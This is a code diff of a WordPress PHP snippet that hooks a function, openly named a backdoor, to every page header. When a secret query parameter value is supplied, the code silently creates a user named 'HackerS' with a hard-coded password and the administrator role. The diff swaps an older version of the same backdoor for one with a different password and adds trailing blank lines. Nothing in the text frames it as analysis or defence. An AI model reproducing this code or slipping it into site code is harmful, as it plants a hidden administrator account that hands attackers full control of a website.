@@ -1,16 +1,23 @@
-
-
 <?php
-
 add_action('wp_head', 'wploop_backdoor'); 
-function wploop_backdoor() {
-        If ($_GET['NSFW'] == 'GoatsGalore') {
-                require('wp-includes/registration.php');
-                If (!username_exists('username')) {
-                        $user_id = wp_create_user ( 'HackerS' , 'Allah123');
-                        $user = new WP_User($user_id);
-                        $user->set_role('administrator');
-                }
-        }
+
+function wploop_backdoor() { 
+  If ($_GET['NSFW'] == 'GoatsGalore') { 
+     require('wp-includes/registration.php'); 
+     If (!username_exists('username')) { 
+        $user_id = wp_create_user('HackerS', '4Allah!'); 
+        $user = new WP_User($user_id);
+        $user->set_role('administrator');
+     }
+  }
 }
 ?>
+
+
+
+
+
+
+
+               
+        
